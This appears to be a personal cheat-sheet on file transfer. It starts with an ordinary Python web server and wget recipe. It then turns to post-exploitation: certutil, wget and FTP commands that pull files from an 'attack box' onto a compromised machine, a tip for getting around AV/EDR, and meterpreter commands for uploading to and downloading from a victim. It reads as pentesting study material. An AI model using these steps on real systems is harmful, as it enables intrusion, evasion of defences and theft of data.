Transfering files (including executables) between devices by turning one device into a simple web server using python (and executing them); written for Linux (Windows will be a bit different in some things):

1) turn device that has file on it into a web server by going to the directory where file resides and opening terminal
2) command:
python -m http.server <PORT, e.g. 9000>
now this device is a server
3) On the device that you wish to download the file to (i.e. the client), open terminal in directory you want file to download to
4) command:
wget http://<IP_of_SERVER>:<SERVER_PORT, e.g. 9000>/<FILE_NAME>
Note: you may not be allowed to download files into every directory. The /tmp directory is likely to allow files to be downloaded to it using wget.
5) allow execution of the file, command:
chmod a+x <FILE_NAME>
6)execute the file from the directory it is in, command:
./<FILE_NAME>

Note: if you have access to a web browser on the machine you are transferring the file to, you can enter simply enter:
http://<IP_of_SERVER>:<SERVER_PORT, e.g. 9000>/<FILE_NAME>
into the browser's url box and hit enter; you will be asked if you want to save the file; simply click ok and the file will be downloaded to the target machine.

If you have compromised a machine and are looking to transfer a file to it from your Linux attack box, here are some good options:

1) HTTP 
Host the file on your attack box and turn it into a webserver by opening a terminal in the file's directory and using the command:
$ python -m SimpleHTTPServer 80

Retrieve the file from your attack box from a compromised Windows machine using the command:
> certutil.exe -urlcache -f http://<ATTACK_BOX_IP>/<FILE_NAME> <NAME_YOU_WANT_FILE_TO_HAVE_ON_WINDOWS_MACHINE>

NOTE: if you have browser access on the compromised machine you can navigate to http://<ATTACK_BOX_IP>/<FILE_NAME> and download

NOTE: If the compromised machine is a Linux OS use the following command to retrieve the file:
$ wget http://<IP_of_ATTACK_BOX>:<PORT>, e.g. 80>/<FILE_NAME>

2) FTP
If the compromised Windows machine is blocking certutil.exe with its AV/EDR you can try FTP instead.
Host the file on your attack box and turn it into a FTP server by opening a terminal in the file's directory and using the command:

$ python -m pyftpdlib 21

then retrieve it by giving the following command in the Windows machine's CLI:

> ftp <ATTACK_BOX_IP>

3) Metasploit
Metasploit has an upload/download feature that works within a meterpreter shell

[from: "Meterpreter upload Command" https://www.youtube.com/watch?v=JPjM-cCQuVs

Uploading to the compromised Windows machine from your attack box:
meterpreter> upload <PATH_TO_FILE_ON_ATTACK_MACHINE/FILENAME> <PATH_TO_WHERE_YOU_WANT_FILE_TO_BE_ON_COMPROMISED_MACHINE>

Downloading from the compromised machine to your attack box:
from: https://www.offsec.com/metasploit-unleashed/meterpreter-basics/#download

download
The download command downloads a file from the remote machine. Note the use of the double-slashes when giving the Windows path.

meterpreter > download c:\\boot.ini
[*] downloading: c:\boot.ini -> c:\boot.ini
[*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini
meterpreter > ]
